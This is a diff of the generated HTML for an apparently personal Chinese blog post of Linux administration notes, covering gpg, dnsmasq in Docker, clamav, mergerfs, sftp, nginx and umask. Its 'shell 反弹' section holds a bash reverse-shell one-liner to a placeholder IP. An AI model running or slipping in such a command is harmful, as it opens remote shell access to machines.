-    <li><a href="#亚马逊加速器配置">亚马逊加速器配置</a></li>
-    <li><a href="#阿里云磁盘分区扩容">阿里云磁盘分区扩容</a></li>
-    <li><a href="#网络故障记录">网络故障记录</a></li>
-    <li><a href="#linux-桌面环境下绑定指定唤起协议">linux 桌面环境下，绑定指定唤起协议</a></li>
-    <li><a href="#解决-virtualbox-仅主机模式无法定制ip网段的问题仅主机模式无法连接公网的问题">解决 Virtualbox 仅主机模式无法定制IP网段的问题(仅主机模式无法连接公网的问题)</a></li>
-    <li><a href="#grafana-查询错误-a-got-error-input-data-must-be-a-wide-series-but-got-type-long-input-refid">grafana 查询错误 <code>[A] got error: input data must be a wide series but got type long (input refid)</code></a></li>
-    <li><a href="#通过yum安装的mysql进行升级的时候报错-xxx-fileetcpkirpm-gpgrpm-gpg-key-mysql">通过yum安装的mysql进行升级的时候报错 <code>xxx file:///etc/pki/rpm-gpg/RPM-GPG-KEY-mysql</code></a></li>
-    <li><a href="#nginx配置特定方法请求时进行密码认证">nginx配置特定方法请求时进行密码认证</a></li>
-    <li><a href="#服务器资源不够导致的问题">服务器资源不够导致的问题</a></li>
-    <li><a href="#通过systemd服务配置文件修改进程优先级">通过<code>systemd</code>服务配置文件修改进程优先级</a></li>
-    <li><a href="#git-删除最近几次提交记录">git 删除最近几次提交记录</a></li>
-  </ul>
-</nav></div>
-            </div><div class="content" id="content"><h1 id="gnupg-加密与解密" class="headerLink">
-    <a href="#gnupg-%e5%8a%a0%e5%af%86%e4%b8%8e%e8%a7%a3%e5%af%86" class="header-mark"></a>GnuPG 加密与解密</h1><h2 id="gpg-对称加密" class="headerLink">
-    <a href="#gpg-%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="header-mark"></a>gpg 对称加密</h2><p>加密:  <code>gpg -c &lt;file&gt;</code>， 输入两次加密密码，完成后生成文件<code>&lt;file&gt;.gpg</code>(加密后源文件保留)<br>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/2021/%E9%82%A3%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E7%9A%84%E8%AE%B0%E5%BD%95.1/">
+              那些杂七杂八的记录(一)
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2021-08-04T00:00:00Z">
+                August 4, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              阅读时间：24 分钟
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/admin/">Admin</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/linux/">Linux</a>
+      <span class="separator">•</span>
+    <a href="/categories/%E8%BF%90%E7%BB%B4%E8%AE%B0%E4%BA%8B/">运维记事</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/">解决方案</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      <div class="post-content">
+        
+        <h1 id="gnupg-加密与解密">
+  GnuPG 加密与解密
+  <a class="heading-link" href="#gnupg-%e5%8a%a0%e5%af%86%e4%b8%8e%e8%a7%a3%e5%af%86">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<h2 id="gpg-对称加密">
+  gpg 对称加密
+  <a class="heading-link" href="#gpg-%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<p>加密:  <code>gpg -c &lt;file&gt;</code>， 输入两次加密密码，完成后生成文件<code>&lt;file&gt;.gpg</code>(加密后源文件保留)<br>
 解密:  <code>gpg &lt;file&gt;.gpg</code>, 输入加密密码,正确后生成文件<code>&lt;file&gt;</code>(解密后加密文件保留)</p>
-<h2 id="gpg-非对称加密" class="headerLink">
-    <a href="#gpg-%e9%9d%9e%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86" class="header-mark"></a>gpg 非对称加密</h2><p>非对称加密/解密文件时，<code>Server</code> 生成私钥与公钥，并把公钥发送给<code>Client</code>, <code>Client</code> 使用公钥加密数据，并把加密后的数据传给<code>Server</code> ，<code>Server</code> 最后使用自己的私钥解密数据。</p>
+<h2 id="gpg-非对称加密">
+  gpg 非对称加密
+  <a class="heading-link" href="#gpg-%e9%9d%9e%e5%af%b9%e7%a7%b0%e5%8a%a0%e5%af%86">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<p>非对称加密/解密文件时，<code>Server</code> 生成私钥与公钥，并把公钥发送给<code>Client</code>, <code>Client</code> 使用公钥加密数据，并把加密后的数据传给<code>Server</code> ，<code>Server</code> 最后使用自己的私钥解密数据。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -383,8 +271,14 @@
 </span></span><span class="line"><span class="cl">&lt;file&gt; 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="docker-创建-dns-server" class="headerLink">
-    <a href="#docker-%e5%88%9b%e5%bb%ba-dns-server" class="header-mark"></a>DOCKER 创建 DNS SERVER</h1><div class="highlight"><div class="chroma">
+</div><h1 id="docker-创建-dns-server">
+  DOCKER 创建 DNS SERVER
+  <a class="heading-link" href="#docker-%e5%88%9b%e5%bb%ba-dns-server">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -424,8 +318,14 @@
 </span></span><span class="line"><span class="cl">$&gt; docker run -d -p 53:53/udp -p 53:53/tcp -p 5380:8080 -v /data/docker/dns/dnsmasq.conf:/etc/dnsmasq.conf --log-opt <span class="s2">&#34;max-size=100m&#34;</span> -e <span class="s2">&#34;HTTP_USER=root&#34;</span> -e <span class="s2">&#34;HTTP_PASS=root&#34;</span> jpillora/dnsmasq
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="dotnet-环境搭建" class="headerLink">
-    <a href="#dotnet-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="header-mark"></a>dotnet 环境搭建</h1><div class="highlight"><div class="chroma">
+</div><h1 id="dotnet-环境搭建">
+  dotnet 环境搭建
+  <a class="heading-link" href="#dotnet-%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -449,8 +349,14 @@
 </span></span><span class="line"><span class="cl">/usr/lib/python2.7/site-packages/supervisor/ui/status.html
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="在linux中删除virbr0接口" class="headerLink">
-    <a href="#%e5%9c%a8linux%e4%b8%ad%e5%88%a0%e9%99%a4virbr0%e6%8e%a5%e5%8f%a3" class="header-mark"></a>在Linux中删除virbr0接口</h1><p><code>virbr0</code>是<code>CentOS7</code>在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的</p>
+</div><h1 id="在linux中删除virbr0接口">
+  在Linux中删除virbr0接口
+  <a class="heading-link" href="#%e5%9c%a8linux%e4%b8%ad%e5%88%a0%e9%99%a4virbr0%e6%8e%a5%e5%8f%a3">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p><code>virbr0</code>是<code>CentOS7</code>在安装过程中选择了相关虚拟化的服务安装后产生的,实际上好像是没什么卵用的</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -465,8 +371,14 @@
 </span></span><span class="line"><span class="cl">$&gt; systemctl restart libvirtd.service
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="linux-杀毒软件-clamav" class="headerLink">
-    <a href="#linux-%e6%9d%80%e6%af%92%e8%bd%af%e4%bb%b6-clamav" class="header-mark"></a>Linux 杀毒软件 clamav</h1><div class="highlight"><div class="chroma">
+</div><h1 id="linux-杀毒软件-clamav">
+  Linux 杀毒软件 clamav
+  <a class="heading-link" href="#linux-%e6%9d%80%e6%af%92%e8%bd%af%e4%bb%b6-clamav">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -486,12 +398,18 @@
 </span></span><span class="line"><span class="cl">$&gt; clamscan -ri /data --remove  -l /var/log/clamscan.log 
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="linux-合并文件系统-margerfs" class="headerLink">
-    <a href="#linux-%e5%90%88%e5%b9%b6%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f-margerfs" class="header-mark"></a>linux 合并文件系统 margerfs</h1><blockquote>
-<p><a href="https://wzyboy.im/post/1148.html" target="_blank" rel="noopener noreferrer">https://wzyboy.im/post/1148.html</a></p>
+</div><h1 id="linux-合并文件系统-margerfs">
+  linux 合并文件系统 margerfs
+  <a class="heading-link" href="#linux-%e5%90%88%e5%b9%b6%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f-margerfs">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://wzyboy.im/post/1148.html"  class="external-link" target="_blank" rel="noopener">https://wzyboy.im/post/1148.html</a></p>
 </blockquote>
 <blockquote>
-<p><a href="https://github.com/trapexit/mergerfs" target="_blank" rel="noopener noreferrer">https://github.com/trapexit/mergerfs</a></p>
+<p><a href="https://github.com/trapexit/mergerfs"  class="external-link" target="_blank" rel="noopener">https://github.com/trapexit/mergerfs</a></p>
 </blockquote>
 <p>使用示例:</p>
 <div class="highlight"><div class="chroma">
@@ -514,8 +432,14 @@
 </span></span><span class="line"><span class="cl">/data01:/data02 /shares fuse.mergerfs defaults,noauto,allow_other,use_ino,minfreespace<span class="o">=</span>10G,ignorepponrename<span class="o">=</span><span class="nb">true</span> <span class="m">0</span> <span class="m">0</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="linux-sftp-搭建" class="headerLink">
-    <a href="#linux-sftp-%e6%90%ad%e5%bb%ba" class="header-mark"></a>linux sftp 搭建</h1><div class="highlight"><div class="chroma">
+</div><h1 id="linux-sftp-搭建">
+  linux sftp 搭建
+  <a class="heading-link" href="#linux-sftp-%e6%90%ad%e5%bb%ba">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -549,8 +473,14 @@
 </span></span><span class="line"><span class="cl">    AllowTcpForwarding no
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="监听本地网卡上没有的ip地址" class="headerLink">
-    <a href="#%e7%9b%91%e5%90%ac%e6%9c%ac%e5%9c%b0%e7%bd%91%e5%8d%a1%e4%b8%8a%e6%b2%a1%e6%9c%89%e7%9a%84ip%e5%9c%b0%e5%9d%80" class="header-mark"></a>监听本地网卡上没有的IP地址</h1><div class="highlight"><div class="chroma">
+</div><h1 id="监听本地网卡上没有的ip地址">
+  监听本地网卡上没有的IP地址
+  <a class="heading-link" href="#%e7%9b%91%e5%90%ac%e6%9c%ac%e5%9c%b0%e7%bd%91%e5%8d%a1%e4%b8%8a%e6%b2%a1%e6%9c%89%e7%9a%84ip%e5%9c%b0%e5%9d%80">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -560,8 +490,14 @@
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;net.ipv4.ip_nonlocal_bind = 1&#39;</span> &gt;&gt; /etc/sysctl.conf
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="腾讯云第二块网卡绑定公网ip" class="headerLink">
-    <a href="#%e8%85%be%e8%ae%af%e4%ba%91%e7%ac%ac%e4%ba%8c%e5%9d%97%e7%bd%91%e5%8d%a1%e7%bb%91%e5%ae%9a%e5%85%ac%e7%bd%91ip" class="header-mark"></a>腾讯云第二块网卡绑定公网ip</h1><p>官方文档是有记录的，这儿记录下服务器上的设置</p>
+</div><h1 id="腾讯云第二块网卡绑定公网ip">
+  腾讯云第二块网卡绑定公网ip
+  <a class="heading-link" href="#%e8%85%be%e8%ae%af%e4%ba%91%e7%ac%ac%e4%ba%8c%e5%9d%97%e7%bd%91%e5%8d%a1%e7%bb%91%e5%ae%9a%e5%85%ac%e7%bd%91ip">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>官方文档是有记录的，这儿记录下服务器上的设置</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -602,9 +538,15 @@
 </span></span><span class="line"><span class="cl">/usr/sbin/ip rule add from 172.21.2.74 table <span class="m">20</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="shell-反弹" class="headerLink">
-    <a href="#shell-%e5%8f%8d%e5%bc%b9" class="header-mark"></a>shell 反弹</h1><blockquote>
-<p><a href="https://blog.csdn.net/weixin_41082546/article/details/104123131" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_41082546/article/details/104123131</a></p>
+</div><h1 id="shell-反弹">
+  shell 反弹
+  <a class="heading-link" href="#shell-%e5%8f%8d%e5%bc%b9">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<blockquote>
+<p><a href="https://blog.csdn.net/weixin_41082546/article/details/104123131"  class="external-link" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41082546/article/details/104123131</a></p>
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -620,8 +562,14 @@
 </span></span><span class="line"><span class="cl">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/&lt;被控端ip&gt;/65535 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="nginx-获取cdn真实用户ip" class="headerLink">
-    <a href="#nginx-%e8%8e%b7%e5%8f%96cdn%e7%9c%9f%e5%ae%9e%e7%94%a8%e6%88%b7ip" class="header-mark"></a>nginx 获取cdn真实用户ip</h1><div class="highlight"><div class="chroma">
+</div><h1 id="nginx-获取cdn真实用户ip">
+  nginx 获取cdn真实用户ip
+  <a class="heading-link" href="#nginx-%e8%8e%b7%e5%8f%96cdn%e7%9c%9f%e5%ae%9e%e7%94%a8%e6%88%b7ip">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -639,20 +587,32 @@
 </span></span><span class="line"><span class="cl">    }
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用" class="headerLink">
-    <a href="#virtualbox---%e4%bb%8e%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a380%e5%88%b0virtualbox%e7%ab%af%e5%8f%a380%e7%9a%84%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8d%e8%b5%b7%e4%bd%9c%e7%94%a8" class="header-mark"></a>virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用</h1><p>此次问题实际出现是在<code>windows</code>上, 理论上说<code>linux</code>下若使用<code>nat</code>功能可能也会出现该问题(至于为什么用<code>nat</code>,<code>virtualbox</code>似乎并不支持桥接网卡,因此要为虚拟机分配物理<code>ip</code>似乎就只能在物理机绑定多个<code>ip</code>,然后<code>nat</code>转发到虚拟机中), <code>virtualbox</code>在转发<code>80</code>端口时似乎会与物理机的<code>80</code>冲突,从而导致转发无效,这个可能是因为我物理机也启用了<code>IIS</code>的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.</p>
+</div><h1 id="virtualbox---从主机端口80到virtualbox端口80的端口转发不起作用">
+  virtualbox - 从主机端口80到VirtualBox端口80的端口转发不起作用
+  <a class="heading-link" href="#virtualbox---%e4%bb%8e%e4%b8%bb%e6%9c%ba%e7%ab%af%e5%8f%a380%e5%88%b0virtualbox%e7%ab%af%e5%8f%a380%e7%9a%84%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91%e4%b8%8d%e8%b5%b7%e4%bd%9c%e7%94%a8">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<p>此次问题实际出现是在<code>windows</code>上, 理论上说<code>linux</code>下若使用<code>nat</code>功能可能也会出现该问题(至于为什么用<code>nat</code>,<code>virtualbox</code>似乎并不支持桥接网卡,因此要为虚拟机分配物理<code>ip</code>似乎就只能在物理机绑定多个<code>ip</code>,然后<code>nat</code>转发到虚拟机中), <code>virtualbox</code>在转发<code>80</code>端口时似乎会与物理机的<code>80</code>冲突,从而导致转发无效,这个可能是因为我物理机也启用了<code>IIS</code>的原因.好吧,以上都是些废话,我也不知道在说些什么,下面看解决方案.</p>
 <ul>
 <li>解决方案</li>
 </ul>
 <ol>
-<li>我是用的 <code>windows</code>的端口转发解决的, <code>virtualbox</code>在<code>nat</code>的时候转发一个其他端口(比如<code>8080</code>)到内部的<code>80</code>, 然后在<code>windows</code> 在进行一次转发,将绑定的<code>ip</code>的<code>80</code>端口转发到<code>8080</code>上,这样也可以解决,骚操作看 <a href="/2022/%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86/#3-windows-%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" rel=""><code>windows命令收集</code>-<code>端口转发</code></a></li>
+<li>我是用的 <code>windows</code>的端口转发解决的, <code>virtualbox</code>在<code>nat</code>的时候转发一个其他端口(比如<code>8080</code>)到内部的<code>80</code>, 然后在<code>windows</code> 在进行一次转发,将绑定的<code>ip</code>的<code>80</code>端口转发到<code>8080</code>上,这样也可以解决,骚操作看 <a href="/2022/%e5%91%bd%e4%bb%a4%e6%94%b6%e9%9b%86/#3-windows-%e7%ab%af%e5%8f%a3%e8%bd%ac%e5%8f%91" ><code>windows命令收集</code>-<code>端口转发</code></a></li>
 <li>还有个说的是用管理员身份运行<code>virtualbox</code>,也可以解决,不过我没有验证过</li>
 </ol>
 <blockquote>
-<p><a href="https://www.coder.work/article/6503907" target="_blank" rel="noopener noreferrer">https://www.coder.work/article/6503907</a></p>
+<p><a href="https://www.coder.work/article/6503907"  class="external-link" target="_blank" rel="noopener">https://www.coder.work/article/6503907</a></p>
 </blockquote>
-<h1 id="服务器默认端口优化" class="headerLink">
-    <a href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bc%98%e5%8c%96" class="header-mark"></a>服务器默认端口优化</h1><ol>
+<h1 id="服务器默认端口优化">
+  服务器默认端口优化
+  <a class="heading-link" href="#%e6%9c%8d%e5%8a%a1%e5%99%a8%e9%bb%98%e8%ae%a4%e7%ab%af%e5%8f%a3%e4%bc%98%e5%8c%96">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ol>
 <li>检查所有非22开启的端口：<code>netstat -lntp</code></li>
 </ol>
 <div class="highlight"><div class="chroma">
@@ -721,12 +681,24 @@
 </span></span><span class="line"><span class="cl">$&gt; systemctl disable postfix.service rpcbind.service rpcbind.socket     <span class="c1"># 禁用开机启动</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="linux-下hosts文件和dns服务器的响应顺序" class="headerLink">
-    <a href="#linux-%e4%b8%8bhosts%e6%96%87%e4%bb%b6%e5%92%8cdns%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e5%93%8d%e5%ba%94%e9%a1%ba%e5%ba%8f" class="header-mark"></a>linux 下hosts文件和dns服务器的响应顺序</h1><ul>
+</div><h1 id="linux-下hosts文件和dns服务器的响应顺序">
+  linux 下hosts文件和dns服务器的响应顺序
+  <a class="heading-link" href="#linux-%e4%b8%8bhosts%e6%96%87%e4%bb%b6%e5%92%8cdns%e6%9c%8d%e5%8a%a1%e5%99%a8%e7%9a%84%e5%93%8d%e5%ba%94%e9%a1%ba%e5%ba%8f">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>通过修改 <code>/etc/nsswitch.conf</code> 进行更换 , 更换<code>/etc/nsswitch.conf: 86</code>中的<code>files</code>和<code>dns</code>的顺序即可</li>
 </ul>
-<h1 id="git-提交类型" class="headerLink">
-    <a href="#git-%e6%8f%90%e4%ba%a4%e7%b1%bb%e5%9e%8b" class="header-mark"></a>git 提交类型</h1><table>
+<h1 id="git-提交类型">
+  git 提交类型
+  <a class="heading-link" href="#git-%e6%8f%90%e4%ba%a4%e7%b1%bb%e5%9e%8b">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<table>
   <thead>
       <tr>
           <th style="text-align: left">类型</th>
@@ -772,8 +744,14 @@
       </tr>
   </tbody>
 </table>
-<h1 id="linux-通过s3fs挂载七牛云存储" class="headerLink">
-    <a href="#linux-%e9%80%9a%e8%bf%87s3fs%e6%8c%82%e8%bd%bd%e4%b8%83%e7%89%9b%e4%ba%91%e5%ad%98%e5%82%a8" class="header-mark"></a>linux 通过s3fs挂载七牛云存储</h1><div class="highlight"><div class="chroma">
+<h1 id="linux-通过s3fs挂载七牛云存储">
+  linux 通过s3fs挂载七牛云存储
+  <a class="heading-link" href="#linux-%e9%80%9a%e8%bf%87s3fs%e6%8c%82%e8%bd%bd%e4%b8%83%e7%89%9b%e4%ba%91%e5%ad%98%e5%82%a8">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
@@ -793,8 +771,14 @@
 </span></span><span class="line"><span class="cl">$&gt; s3fs s3空间名 /mnt/s3fs -o <span class="nv">passwd_file</span><span class="o">=</span>/mnt/.passwd-s3fs -o <span class="nv">url</span><span class="o">=</span>http://s3-cn-north-1.qiniucs.com -o use_path_request_style   <span class="c1"># -o dbglevel=info -f -o curldbg # 日志信息</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="普通用户校验是否有权限通过dockersock操作-docker" class="headerLink">
-    <a href="#%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%a0%a1%e9%aa%8c%e6%98%af%e5%90%a6%e6%9c%89%e6%9d%83%e9%99%90%e9%80%9a%e8%bf%87dockersock%e6%93%8d%e4%bd%9c-docker" class="header-mark"></a>普通用户校验是否有权限通过docker.sock操作 docker</h1><div class="highlight"><div class="chroma">
+</div><h1 id="普通用户校验是否有权限通过dockersock操作-docker">
+  普通用户校验是否有权限通过docker.sock操作 docker
+  <a class="heading-link" href="#%e6%99%ae%e9%80%9a%e7%94%a8%e6%88%b7%e6%a0%a1%e9%aa%8c%e6%98%af%e5%90%a6%e6%9c%89%e6%9d%83%e9%99%90%e9%80%9a%e8%bf%87dockersock%e6%93%8d%e4%bd%9c-docker">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -802,8 +786,14 @@
 <pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">sudo</span> <span class="o">-</span><span class="n">u</span> <span class="n">zabbix</span> <span class="n">curl</span> <span class="o">--</span><span class="n">unix</span><span class="o">-</span><span class="n">socket</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">docker</span><span class="o">.</span><span class="n">sock</span> <span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">buffer</span> <span class="o">-</span><span class="n">XGET</span> <span class="n">v1</span><span class="o">.</span><span class="mi">24</span><span class="o">/</span><span class="n">_ping</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="rdesktop-远程桌面工具安装" class="headerLink">
-    <a href="#rdesktop-%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85" class="header-mark"></a>rdesktop 远程桌面工具安装</h1><ul>
+</div><h1 id="rdesktop-远程桌面工具安装">
+  rdesktop 远程桌面工具安装
+  <a class="heading-link" href="#rdesktop-%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%b7%a5%e5%85%b7%e5%ae%89%e8%a3%85">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>rdesktop 用于linux下的rdp工具，还是非常好用的</li>
 </ul>
 <div class="highlight"><div class="chroma">
@@ -816,8 +806,14 @@
 </span></span><span class="line"><span class="cl">$&gt; rdesktop -a 16 -g 1900x960 -r clipboard:PRIMARYCLIPBOARD -r disk:floppy=/tmp/ -u administrator &lt;server_ip&gt;:&lt;port&gt; -p&lt;password&gt;
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h1 id="umask-计算方法" class="headerLink">
-    <a href="#umask-%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95" class="header-mark"></a>Umask 计算方法</h1><ul>
+</div><h1 id="umask-计算方法">
+  Umask 计算方法
+  <a class="heading-link" href="#umask-%e8%ae%a1%e7%ae%97%e6%96%b9%e6%b3%95">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<ul>
 <li>当创建目录时候，<code>目录创建后的权限</code> =  <code>默认目录最大权限(777)</code> - <code>umask 权限</code>
 <ul>
 <li><code>umask=0022 --&gt; 777 - 022 = 755(目录权限)</code></li>
@@ -835,9 +831,21 @@
 </ul>
 </li>
 </ul>
-<h1 id="输入输出重定向" class="headerLink">
-    <a href="#%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>输入输出重定向</h1><h2 id="文件描述符" class="headerLink">
-    <a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" class="header-mark"></a>文件描述符</h2><table>
+<h1 id="输入输出重定向">
+  输入输出重定向
+  <a class="heading-link" href="#%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e9%87%8d%e5%ae%9a%e5%90%91">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h1>
+<h2 id="文件描述符">
+  文件描述符
+  <a class="heading-link" href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6">
+    <i class="fa-solid fa-link" aria-hidden="true" title="链接到标题"></i>
+    <span class="sr-only">链接到标题</span>
+  </a>
+</h2>
+<table>
   <thead>
       <tr>
           <th style="text-align: left">文件描述符</th>
@@ -867,9 +875,15 @@
       </tr>
   </tbody>
 </table>
-<h2 id="标准重定向" class="headerLink">
-    <a href="#%e6%a0%87%e5%87%86%e9%87%8d%e5%ae%9a%e5%90%91" class="header-mark"></a>标准重定向</h2><blockquote>
